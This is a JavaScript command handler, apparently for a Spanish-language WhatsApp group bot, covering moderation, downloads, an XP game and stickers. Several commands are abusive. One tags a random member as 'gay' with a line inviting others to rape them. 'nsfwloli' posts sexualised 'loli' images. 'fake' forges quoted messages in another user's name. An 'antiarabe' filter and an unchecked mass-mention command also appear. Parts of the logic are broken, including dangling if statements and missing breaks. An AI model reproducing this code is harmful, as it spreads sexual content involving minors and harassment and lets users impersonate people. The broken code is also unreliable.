case 'antiarabe':
case 'detect':
case 'antilink': {
if (!m.isGroup) return reply(info.group)
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!text) return reply(`*Use de esta forma ejemplo:*\n*${prefix + command} on*\n*${prefix + command} off*`)
if (args[0] === "on") {
if (!global.db.data.chats[m.chat].detect) 
if (!global.db.data.chats[m.chat].antilink) 
if (!global.db.data.chats[m.chat].audios) 
if (!global.db.data.chats[m.chat].welcome)
if (!global.db.data.chats[m.chat].modeadmin)
if (!global.db.data.chats[m.chat].antifake)
if (!global.db.data.chats[m.chat].antiarabe)
global.db.data.chats[m.chat].detect = true
global.db.data.chats[m.chat].antilink = true
global.db.data.chats[m.chat].audios = true
global.db.data.chats[m.chat].welcome = true
global.db.data.chats[m.chat].modeadmin = true
global.db.data.chats[m.chat].antifake = true
global.db.data.chats[m.chat].antiarabe = true
reply(`*✅El ${command} se activo con exito*`)
} else if (args[0] === "off") {
if (!global.db.data.chats[m.chat].detect) 
if (!global.db.data.chats[m.chat].antilink)
if (!global.db.data.chats[m.chat].audios) 
if (!global.db.data.chats[m.chat].welcome) 
if (!global.db.data.chats[m.chat].modeadmin)
if (!global.db.data.chats[m.chat].antifake)
if (!global.db.data.chats[m.chat].antiarabe)
global.db.data.chats[m.chat].detect = false
global.db.data.chats[m.chat].antilink = false
global.db.data.chats[m.chat].audios = false
global.db.data.chats[m.chat].welcome = false
global.db.data.chats[m.chat].modeadmin = false
global.db.data.chats[m.chat].antifake = false
global.db.data.chats[m.chat].antiarabe = false
reply(`*${command} desactivado!*`)
}}
case 'modojadibot':
case 'anticall': 
if (!isCreator) return reply(info.owner)
if (args[0] === "on") {
if (db.data.chats[m.chat].modojadibot)
if (db.data.settings[numBot].anticall)
db.data.chats[m.chat].modojadibot = true
db.data.settings[numBot].anticall = true
reply(`*✅El ${command} se activo con exito*`)
} else if (args[0] === "off") {
if (db.data.chats[m.chat].modojadibot)
if (db.data.settings[numBot].anticall)
db.data.settings[numBot].anticall = false
db.data.chats[m.chat].modojadibot = false
reply(`*${command} desactivado!*`)
}
break

case 'join': {
if (!isCreator) return reply(info.owner)
if (!text) return reply(`*Y EL LINK DEL GRUPO?*`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(`*Link incorrecto!*`)
reply(`*YA ME UNIR 😼*`)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))}
break
            
case 'hidetag': {
if (!m.isGroup) return reply(info.group) 
//if (!isBotAdmins) return reply(info.botAdmin)
//if (!isGroupAdmins) return reply(info.admin)
if (!q) return reply(`*Y el texto?*`)
conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })}
break 

case 'leave': {
if (!isCreator) return reply(info.owner)
reply(m.chat, `*Adios fue un gusto esta aqui hasta pronto 👋*`)
await conn.groupLeave(m.chat)}
break

case 'setppname': case 'nuevonombre': case 'newnombre': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!text) return reply('*⚠️ Ingresa el texto*')
await conn.groupUpdateSubject(m.chat, text)
await reply(`*✅El nombre del grupo se cambio correctamente*`)}
break
case 'setdesc': case 'descripción': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!text) return reply('*⚠️ Ingresa el texto*')
await conn.groupUpdateDescription(m.chat, text)
await reply(`*✅La descripción del grupo se cambio con éxito*`)}
break
case 'setppgroup': case 'setpp': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!quoted) return reply(`*⚠️Y la imagen?*`)
if (!/image/.test(mime)) return reply(`*⚠️ Responde a una con:* ${prefix + command}`)
if (/webp/.test(mime)) return reply(`*⚠️Responde a una  Image con :* ${prefix + command}`)
var mediz = await conn. downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await conn.query({tag: 'iq', attrs: {to: m.chat, type:'set', xmlns: 'w:profile:picture' }, content: [ {tag: 'picture', attrs: { type: 'image' }, content: img } ]}) 
fs.unlinkSync(mediz)
reply(`*✅Exito*`)
} else {
var memeg = await conn.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*✅Exito*`)}}
break

case 'add': {
if (!m.isGroup) return reply(info.group);  
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!isCreator) return reply(info.owner)
if (!text) return reply(`*[ ⚠️ ] INGRESA EL NÚMERO DEL LA PERSONA QUE QUIERA AGREGA*\n*EJEMPLO:*\n${prefix}add +5244446577`)
if (text.includes('+')) return reply(`*⚠️ INGRESA EL NUMERO SIN EL (+)*`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await conn.groupInviteCode(group)
await conn.sendMessage(text+'@s.whatsapp.net', {text: `≡ *INVITACIÓN*\n\nHola un usuario te invito a unirte a este grupos\n\n${link}`, mentions: [m.sender]})
reply(`*✅Listo*`)}
break
            
case 'kick': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!m.quoted) return reply(`[ ⚠️ ] A QUIEN CARAJO ELIMINO? ETIQUETA ALGUN USUARIO NO SOY ADIVINO 😯`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
conn.groupParticipantsUpdate(m.chat, [users], 'remove')}
break
	
case 'promote': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE DOY ADMIN? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
	
case 'demote': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!m.quoted) return reply(`*[ ⚠️ ] A QUIEN LE QUITO ADMINS? ETIQUETA A LA PERSONA O RESPONDE A SUS MENSAJES*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
             
case 'link': case 'linkgc': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
let response = await conn. groupInviteCode(m.chat)
conn.sendText(m.chat, `https://chat.whatsapp.com/${response}`, m, { detectLink: true })}
break
                        	
case 'block': case 'bloquear': {
if (!isCreator) return reply(info.owner)
reply(`*El usuario fue bloqueado del bot*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block')}
break
	
case 'unblock': case 'desbloquear': {
if (!isCreator) return reply(info.owner)
reply(`*El usuario fue desbloqueado*`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock')}
break
	
case 'banchat': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
if (!text) return reply(`*Accion mal usaba*\n\n*Use de esta forma:*\n*${prefix + command} on*\n*${prefix + command} off*`)
if (args[0] === "on") {
if (db.data.chats[m.chat].ban) return reply(`*Ya esta baneado este chat*`)
db.data.chats[m.chat].ban = true
reply(`*BOT OFF*`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].ban) return reply(`*Este chat ya esta desbaneado*`)
db.data.chats[m.chat].ban = false
reply(`*BOT ONLINE YA ESTOY DISPONIBLE ✅*`)}}
break
             
case 'tagall': {
if (!m.isGroup) return reply(info.group) 
if (!isBotAdmins) return reply(info.botAdmin)
if (!isGroupAdmins) return reply(info.admin)
let teks = `❑ ━〔 *📢 ＩＮＶＯＣＡＣＩＯ́Ｎ 📢* 〕━ ❑\n\n`
teks += `❑ Mensaje:  ${q ? q : 'Active perra'}\n\n`
for (let mem of participants) {
teks += `➥ @${mem.id.split('@')[0]}\n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break

case 'ping':  
var timestamp = speed();  
var latensi = speed() - timestamp  
conn.sendMessage(from, { text: `*Pong 🏓  ${latensi.toFixed(4)}*` }, { quoted: msg });  
break  		

case 'report': {
if (!text) return reply(`*𝙸𝙽𝙶𝚁𝙴𝚂𝙴 𝙴𝙻 𝙲𝙾𝙼𝙰𝙽𝙳𝙾 𝙲𝙾𝙽 𝙵𝙰𝙻𝙻𝙾𝚂*\n\n*𝙴𝙹𝙴𝙼𝙿𝙻𝙾:*\n${prefix + command} sticker no funciona`)
conn.sendMessage(`595975740803@s.whatsapp.net`, {text: `╭━━〔 *𝚁𝙴𝙿𝙾𝚁𝚃𝙴 | 𝚁𝙴𝙿𝙾𝚁𝚃 * 〕━━⬣\n┃\n┃✿ *𝙽𝚞𝚖𝚎𝚛𝚘 | 𝚗𝚞𝚖𝚋𝚎𝚛*\n┃⇢ wa.me/${m.sender.split("@")[0]}\n┃\n┃✿ *𝙼𝚎𝚗𝚜𝚊𝚓𝚎 | 𝚝𝚎𝚡𝚝*\n┃: ${text}┃\n╰━━━〔 *${vs}* 〕━━━⬣` })
reply(`*𝙴𝙻 𝚁𝙴𝙿𝙾𝚁𝚃𝙴 𝙵𝚄𝙴 𝙴𝙽𝚅𝙸𝙰𝙳𝙾 𝙰 𝙼𝙸 𝙲𝚁𝙴𝙰𝙳𝙾𝚁, 𝙽𝙾𝚂 𝙲𝙾𝙽𝚃𝙰𝚁𝙴𝙼𝙾𝚂 𝙲𝙾𝙽 𝚄𝚂𝚃𝙴𝙳 𝚂𝙸 𝙴𝚂 𝙽𝙴𝙲𝙴𝚂𝙰𝚁𝙸𝙾, 𝙳𝙴 𝚂𝙴𝚁 𝙵𝙰𝙻𝚂𝙾 𝚂𝙴𝚁𝙰 𝙸𝙶𝙽𝙾𝚁𝙰𝙳𝙾 𝚈 𝙱𝙻𝙾𝚀𝚄𝙴𝙰𝙳𝙾 𝙳𝙴𝙻 𝙱𝙾𝚃*`)}
break 

case "tts":
if (!q) return reply("*Y EL TEXTO?*")
await conn.sendPresenceUpdate('recording', m.chat)
let texttosay = text
? text
: m.quoted && m.quoted.text
? m.quoted.text
: m.text;
const SpeakEngine = require("google-tts-api"); 
const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "es", slow: false, host: "https://translate.google.com",});
conn.sendMessage(m.chat, { audio: { url: texttospeechurl }, contextInfo: { "externalAdReply": { "title": botname, "body": ``, "previewType": "PHOTO", "thumbnailUrl": null,"thumbnail": imagen1, "sourceUrl": md, "showAdAttribution": true}}, seconds: '4556', ptt: true, mimetype: 'audio/mpeg', fileName: `error.mp3` }, { quoted: m })
break		

case "a":
if (!global.db.data.chats[m.chat].audios) return
let vn = './media/a.mp3'
await conn.sendPresenceUpdate('recording', m.chat)
conn.sendMessage(m.chat, { audio: { url: vn }, contextInfo: { "externalAdReply": { "title": botname, "body": ``, "previewType": "PHOTO", "thumbnailUrl": null,"thumbnail": imagen1, "sourceUrl": md, "showAdAttribution": true}}, seconds: '4556', ptt: true, mimetype: 'audio/mpeg', fileName: `error.mp3` }, { quoted: m })
break
              		
case 'simi': case 'bot': {
if (!text) return conn.sendMessage(from, { text: `*INGRESE UN TEXTO PARA HABLAR CONMIGO*` }, { quoted: msg })
await conn.sendPresenceUpdate('composing', m.chat)
let anu = await fetchJson(`https://api.simsimi.net/v2/?text=${text}&lc=es&cf=false`)
let res = anu.success;
m.reply(res)
}
break 
		
case 'ia': case 'chatgpt':
if (global.db.data.users[m.sender].limit < 1) return reply(info.endLimit)
if (!text) return conn.sendMessage(from, { text: `*INGRESE EL TEXTO DE LOS QUE QUIERE BUSCAR?*` }, { quoted: msg })
await conn.sendPresenceUpdate('composing', m.chat)
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai-turbo?apikey=${lolkeysapi}&text=${text}`)
let hasill = await tioress.json()
m.reply(`${hasill.result}`.trim())   
db.data.users[m.sender].limit -= 1
break

case 'gay': {
if (!m.isGroup) return reply(info.group) 
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
let kah = ra[Math.floor(Math.random() * ra.length)]
let jawab = `@${jodoh.split('@')[0]} Es 🏳️‍🌈 ${kah}% Gay\n\nQuién quiere violar a este gay? `
let ments = [me, jodoh]
conn.sendMessage(m.chat, { text: jawab, contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, }}, { quoted: m })}
break
            
case 'pareja':
if (!m.isGroup) return reply(info.group) 
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let love = member[Math.floor(Math.random() * member.length)]
conn.sendMessage(m.chat, { text: `*Te deberias casar con @${love.split('@')[0]} hacen una bonita pareja 💕*`,
contextInfo:{
mentionedJid:[me, love],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${botname}`,
"body": `${pushname}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": imagen1, 
"sourceUrl": md}}},
{ quoted: m})
break

case 'fake':
var gh = body.slice(11);
var mentioned = m.message.extendedTextMessage && m.message.extendedTextMessage.contextInfo && m.message.extendedTextMessage.contextInfo.mentionedJid ? m.message.extendedTextMessage.contextInfo.mentionedJid[0] : null;
var replace = gh.split("|")[0];
var target = gh.split("|")[1];
var bot = gh.split("|")[2];
if (mentioned && target && bot) {
var quotedMessage = {
key: {
fromMe: false,
participant: mentioned
},
message: {
conversation: target
}};
var sendMessageOptions = {
text: `${bot}`,
quoted: quotedMessage
};
conn.sendMessage(from, sendMessageOptions, { quoted: quotedMessage });
} else {
conn.sendMessage(from, { text: `Ejemplo: ${prefix + command} @tag|puto|😯`}, { quoted: msg });
}
break
  
case 'hentai':
if (!m.isGroup) return reply(info.group) 
if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)
var hentai = JSON.parse(fs.readFileSync('./src/nsfw/neko.json'))
var hentairesult = pickRandom(hentai)
conn.sendMessage(m.chat, { caption: `🥵`, image: { url: hentairesult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return reply(info.group) 
if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)
var nsfw = JSON.parse(fs.readFileSync('./src/nsfw/nsfwloli.json'))
var result = pickRandom(nsfw)
conn.sendMessage(m.chat, { caption: 'Yo soy tu loli 🥵', image: { url: result.url } }, { quoted: m })
break
case 'lewd': case 'feed': case 'gasm': case 'anal': case 'holo': case 'tits': case 'kuni': case 'kiss': case 'erok': case 'smug': case 'solog': case 'feetg': case 'lewdk': case 'waifu': case 'pussy': case 'femdom': case 'cuddle': case 'eroyuri': case 'cum_jpg': case 'blowjob': case 'holoero': case 'erokemo': case 'fox_girl': case 'futanari': case 'wallpaper':
if (!m.isGroup) return reply(info.group) 
if (!global.db.data.chats[m.chat].antiNsfw) return reply(info.nsfw)
sendImageAsUrl(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolkeysapi}`, `*🔥 ${command} 🔥*`)
break
		    
case 'play':  case 'play2': {
if (!text) return conn.sendMessage(from, { text: `*ingrese nombre de alguna cancion*` }, { quoted: msg })
let yts = require("youtube-yts")
let search = await yts(text)
let anup3k = search.videos[0]
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
conn.sendMessage(from, { image : eek, caption:  `╭───≪~*╌◌ᰱ•••⃙❨͟͞P̸͟͞L̸͟A̸͟͞Y̸͟͞❩⃘•••ᰱ◌╌*~*
│║📌 *Título* : ${anu.title}
│║📆 *Publicado:* ${anu.ago}
│║⌚ *Duración:* ${anu.timestamp}
│║👤 *Autor:* ${anu.author.name}
│║👀 *Vistas:*  ${anu.views}
│║
│║  *si quiere descarga el video usar:*
│║ #ytvideo ${anu.url}
╰─•┈┈┈•••✦𝒟ℳ✦•••┈┈┈•─╯⟤` }, { quoted: m})
const playmp3 = require('./libs/ytdl2')
const pl= await playmp3.mp3(anup3k.url)
await conn.sendMessage(from, { audio: fs.readFileSync(pl.path), fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: m }); 
await fs.unlinkSync(pl.path)
db.data.users[m.sender].limit -= 1
reply(info.limit) 
}
break
case "ytmp3": case "ytaudio": 
const mp = require('./libs/ytdl2')
if (args.length < 1 || !isUrl(text) || !mp.isYTUrl(text)) return reply(`*Que esta buscado?*\n\n*Ejemplo:*\n${prefix + command} https://youtu.be/7ouFkoU8Ap8?si=Bvm3LypvU_uGv0bw`)
conn.sendMessage(from, { text: `*Aguarde un momento*\n\nᴱˡ ᴬᵘᵈᶦᵒ ᵖᵘᵉᵈᵉ ᵗᵃʳᵈᵃ ᵉⁿᵗʳᵉ ⁵ ᵒ ¹⁰ ᵐᶦⁿᵘᵗᵒˢ ᵉˡ ᵉⁿᵛᶦᵃˢᵉ ᵗᵉⁿᵈʳᵃ́ ᵖᵃᶜᶦᵉⁿᶜᶦᵃ` }, { quoted: fdoc });    
let mediaa = await ytplayvid(text)
const audio = await mp.mp3(text)
await conn.sendMessage(from, {audio: fs.readFileSync(audio.path), mimetype: 'audio/mp4',
contextInfo: {
externalAdReply: { title:audio.meta.title,
body: botname,
//await getBuffer(pl.meta.image),
thumbnail: getBuffer(audio.meta.image), 
mediaType:2,
mediaUrl:text,
}}}, {quoted:m})
await fs.unlinkSync(audio.path)
db.data.users[m.sender].limit -= 1
reply(info.limit) 
break
case 'ytmp4': case 'ytvideo': {
const mp = require('./libs/ytdl2')
if (args.length < 1 || !isUrl(text) || !mp.isYTUrl(text)) return reply(`*Que esta buscado?*\n\n*Ejemplo:*\n${prefix + command} https://youtu.be/7ouFkoU8Ap8?si=Bvm3LypvU_uGv0bw`)
conn.sendMessage(from, { text: `*Aguarde un momento*\n\nᴱˡ ᵛᶦᵈᵉᵒ ᵖᵘᵉᵈᵉ ᵗᵃʳᵈᵃ ᵉⁿᵗʳᵉ ⁵ ᵒ ¹⁰ ᵐᶦⁿᵘᵗᵒˢ ᵉˡ ᵉⁿᵛᶦᵃˢᵉ ᵗᵉⁿᵈʳᵃ́ ᵖᵃᶜᶦᵉⁿᶜᶦᵃ` }, { quoted: fdoc });    
const vid = await mp.mp4(text)
const ytc = `*❏ Título :* ${vid.title} 
*❏ Duración :* ${vid.timestamp}
*❏ Subido :* ${vid.date}
*❏ calidad :* ${vid.quality}`
await conn.sendMessage(from, {video: {url : vid.videoUrl}, caption: ytc }, {quoted:m})
db.data.users[m.sender].limit -= 1
reply(info.limit) 
}
break   

case "facebook": case "fb":{
if (!text) return reply(`*Y el link?*\n\n*Ejemplo:* ${prefix + command} https://www.facebook.com/groups/2616981278627207/permalink/3572542609737731/?mibextid=Nif5oz`)
//XeonStickWait()
const Rres = await fetch(`https://api.lolhuman.xyz/api/facebook?apikey=${lolkeysapi}&url=${args[0]}`);
 const Jjson = await Rres.json();
 let VIDEO = Jjson.result[0];
 if (VIDEO == '' || !VIDEO || VIDEO == null) VIDEO = Jjson.result[1];
        //conn.sendFile(m.chat, VIDEO, 'error.mp4', `*𝙰𝚀𝚄𝙸 𝙴𝚂𝚃𝙰 𝚂𝚄 𝚅𝙸𝙳𝙴𝙾*`, m);
await conn.sendMessage(from, {video:{url: Rres}, caption: 'Exito'}, {quoted:m})
}
break
case "igvid": case "instagram": {
if (!text) return reply(`*Y el link?"\n\n*Ejemplo:* ${prefix + command} https://www.instagram.com/reel/Ctjt0srIQFg/?igshid=MzRlODBiNWFlZA==`)
//XeonStickWait()
let insta = await instagram(text)
const gha1 = await conn.sendMessage(m.chat,{video:{url: insta.url[0].url},caption: 'Exitos'},{quoted:m})
}
break

case 'git': case 'gitclone':
if (!args[0]) return reply(`*Ejemplo :*\n${prefix + command} ${md}`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalido!!`)
conn.sendMessage(from, { text: `*𝘈𝘎𝘜𝘈𝘙𝘋𝘌 𝘜𝘕 𝘔𝘖𝘔𝘌𝘕𝘛𝘖...*\n\nˢᶦ ᵉˡ ᵃʳᶜʰᶦᵛᵒ ⁿᵒ ˡˡᵉᵍᵃ ᵉˢ ᵠᵘᵉ ʳᵉᵖᵒˢᶦᵗᵒʳᶦᵒ ᵉˢ ᵐᵘʸ ᵖᵉˢᵃᵈᵒ` }, { quoted: m })
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
conn.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(info.error))
db.data.users[m.sender].limit -= 1
reply(info.limit) 
break

case 'tiktok':
if (!text) return m.reply( `*Ejemplo:* ${prefix + command} https://vm.tiktok.com/ZMjdrFCtg/`)
if (!q.includes('tiktok')) return m.reply(`*link invalido!*`)
//await loading ()
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
require('./libs/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })})
db.data.users[m.sender].limit -= 1
reply(info.limit) 
break

case 'lyrics': case 'letra': {
if (!text) return reply(`*Que esta buscado? ingresa el titulo/nombre de la canción*\n*Ejemplo:* ${prefix + command} ozuna`)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
conn.editMessage(m.chat, '*Aguarde un momento....*', `*❏ Titulo:* ${result.title}\n*❏ Autor :* ${result.author}\n*❏ Url :* ${result.link}\n\n*❏ Letra :* ${result.lyrics}`, 3, fkontak)
db.data.users[m.sender].limit -= 1
reply(info.limit) 
}
break

case 'ss': case 'ssweb': {
if (!q) return reply(`*Ejemplo:* ${prefix+command} link`)
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
let krt = await scp1.ssweb(q)
conn.sendMessage(from, {image:krt.result, caption: info.result}, {quoted:m})
}
break

case 'buy': {
let count = command.replace(/^buy/i, '');
count = count ? /all/i.test(count) ? Math.floor(global.db.data.users[m.sender].exp / 450) : parseInt(count) : args[0] ? parseInt(args[0]) : 1;
count = Math.max(1, count);
if (global.db.data.users[m.sender].exp >= 450 * count) {
global.db.data.users[m.sender].exp -= 450 * count;
global.db.data.users[m.sender].limit += count;
reply(`╔═❖ *ɴᴏᴛᴀ ᴅᴇ ᴘᴀɢᴏ*\n║‣ *ʜᴀs ᴄᴏᴍᴘʀᴀᴅᴏ :* ${count}💎\n║‣ *ʜᴀs ɢᴀsᴛᴀᴅᴏ :* ${450 * count} XP\n╚═══════════════`);
} else reply(`🔶 ɴᴏ ᴛɪᴇɴᴇ sᴜғɪᴄɪᴇɴᴛᴇ xᴘ ᴘᴀʀᴀ ᴄᴏᴍᴘʀᴀʀ *${count}* ᴅɪᴀᴍᴀɴᴛᴇ 💎 ᴘᴜᴇᴅᴇs ᴄᴏɴsᴇɢᴜɪʀ *xᴘ* ᴜsᴀɴᴅᴏ ᴇʟ ᴄᴏᴍᴀɴᴅᴏs #minar`)}
break

case 'minar': case 'mine':
const date = global.db.data.users[m.sender].lastmiming + 600000;
if (new Date - global.db.data.users[m.sender].lastmiming < 600000) return reply(`*[ ⏳ ] Espera ${msToTime(date - new Date())} min para volver a minar*`) 
const exp = Math.floor(Math.random() * 1000)
global.db.data.users[m.sender].exp += exp;
reply(`*Genial minaste ${exp} XP*`)
global.db.data.users[m.sender].lastmiming = new Date * 1;
break 

case 'claim': {
let time = global.db.data.users[m.sender].lastclaim + 86400000
if (new Date - global.db.data.users[m.sender].lastclaim < 86400000) return reply(`🎁 *ʏᴀ ʀᴇᴄᴏɢɪsᴛᴇ ᴛᴜ ʀᴇᴄᴏᴍᴘᴇɴsᴀ ᴅɪᴀʀɪᴀ*\n\n🕚 ᴠᴜᴇʟᴠᴇ ᴇɴ *${msToTime(time - new Date())}* `) 
global.db.data.users[m.sender].exp += 20000 ? prem : 5000
m.reply(`🎁 *ʀᴇᴄᴏᴍᴘᴇɴsᴀ ᴅɪᴀʀɪᴀ*

🔸 *ʜᴀs ʀᴇᴄɪʙɪᴅᴏ:*
🆙 *xᴘ* : +${20000 ? prem : 5000}`)
global.db.data.users[m.sender].lastclaim = new Date * 1
}
break 

case 'trabajar': case 'work': {
let hasil = Math.floor(Math.random() * 2000)
let time = global.db.data.users[m.sender].lastwork + 3600000
if (new Date - global.db.data.users[m.sender].lastwork < 3600000) return reply(`ᴇsᴛᴀ ᴄᴀɴsᴀᴅᴏ, ᴇsᴘᴇʀᴀs ${msToTime(time - new Date())} ᴘᴀʀᴀ ᴠᴏʟᴠᴇʀ ᴀ ᴛʀᴀʙᴀᴊᴀ!`) 
let anu = (await axios.get('https://raw.githubusercontent.com/fgmods/fg-team/main/games/work.json')).data
let res = pickRandom(anu)
global.db.data.users[m.sender].exp += hasil
reply(`🔸 ${res.fgwork} *${hasil} XP*`)
global.db.data.users[m.sender].lastwork = new Date * 1
}
break

case 'rob': case 'robar': {
const date = global.db.data.users[m.sender].robs + 600000;
if (new Date - global.db.data.users[m.sender].robs < 600000) return reply(`*🚓 Regresa el ${msToTime(date - new Date())} minutos*`) 
if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : false;
else who = m.chat;
if (!who) return reply(`*⚠️ ETIQUETA A LA PERSONA BOBO*`) 
if (!(who in global.db.data.users)) return reply(`*⚠️ El usuario no se encuentra en mi base de datos.*`);
const users = global.db.data.users[who];
const rob = Math.floor(Math.random() * 500);
if (users.exp < rob) return conn.sendMessage(from ,{text: `*Este @${who.split`@`[0]} es Pobre tiene menos de 500 xp*`, mentions: [who], },{quoted: m})
global.db.data.users[m.sender].exp += rob;
global.db.data.users[who].exp -= rob;
conn.sendMessage(from ,{text: `*🐭 Robaste ${rob} XP a @${who.split`@`[0]}*`, mentions: [who], },{quoted: m})
global.db.data.users[m.sender].robs = new Date * 1;
}
break

case 's': case 'sticker': {  
if (/image/.test(mime)) {  
conn.fakeReply(m.chat, `⏳ *Aguarde un momento estoy creando tu stickers....*`, '0@s.whatsapp.net', 'No haga spam')
//conn.sendMessage(m.chat, { text: `⏳ *Aguarde un momento estoy creando tu stickers....*\n\n*ᴺᵒ ʰᵃᵍᵃ ˢᵖᵃᵐ*` }, { quoted: m });    
media = await quoted.download()  
let encmedia = await conn.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author })  
await fs.unlinkSync(encmedia)  
} else if (/video/.test(mime)) {  
if ((quoted.msg || quoted).seconds > 20) return reply('¡Máximo 20 segundos!')  
media = await quoted.download()  
let encmedia = await conn.sendVideoAsSticker(from, media, m, { packname: global.author, author: global.packname })  
await new Promise((resolve) => setTimeout(resolve, 2000));   
await fs.unlinkSync(encmedia)  
} else {  
reply(`*Y LA IMAGEN?*`)  
}}  
break; 

case 'wm': case 'take': {
if (!args.join(" ")) return reply(`*Responda un sticker para robar*`)
conn.fakeReply(m.chat, `⏳ *Aguarde un momento....*`, '0@s.whatsapp.net', 'No haga spam')
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
conn.downloadAndSaveMediaMessage(quoted, "gifee")
conn.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
reply(`Y la imagen?`)
}
}
break

case 'bcgc': case 'bcgroup': {
if (!isCreator) return conn.sendMessage(from, { text: info.owner }, { quoted: msg });   
